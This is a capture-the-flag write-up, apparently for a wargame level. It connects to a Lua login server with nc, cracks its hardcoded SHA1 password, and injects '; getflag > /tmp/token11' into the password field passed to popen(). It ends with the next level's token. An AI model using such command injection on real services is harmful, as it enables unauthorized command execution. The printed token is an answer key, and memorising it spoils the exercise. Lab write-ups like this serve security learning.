# Explanations of steps for level11

We can see a .lua file executable in the home and flag11 rights, 
at execution, it says "address in use" and after a :
	ps aux | grep level11

We can see the file already launched, at a cat we can see it launch a server on port 5151.
So let's try to connect with nc
	nc 127.0.0.1 5151

It asks a password.
With cat we can see a login function, with a password passed to popen() as a parameter,
and hashed with sha1sum.
We can see the Hashed password in hard, first let's try to hack the hashed pass.
On the site : https://md5hashing.net
We can see the string hacked "NotSoEasy", su on flag11 doesn't work.

We can now try to inject some code to the program passing by popen(), to execute getflag.
Let's connect and set the password as an injection getflag command with a ";"
	nc 127.0.0.1 5151
	; getflag > /tmp/token11
or
	echo "; getflag > /tmp/token11" | nc 127.0.0.1 5151

We can see the /tmp/token file with the output
	cat /tmp/token11

Token for level12 is: "fa6v5ateaw21peobuub8ipe6s"
